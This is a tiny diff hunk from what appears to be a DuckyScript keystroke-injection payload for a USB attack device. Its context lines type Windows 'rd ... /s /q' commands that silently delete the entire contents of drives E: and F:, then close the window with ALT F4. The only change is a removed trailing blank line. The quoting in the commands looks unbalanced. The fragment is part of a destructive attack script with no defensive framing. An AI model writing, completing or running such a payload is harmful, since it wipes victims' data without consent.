@@ -34,4 +34,3 @@ STRING rd "E: /s /q
 ENTER
 STRING rd "F: /s /q 
 ALT F4
-
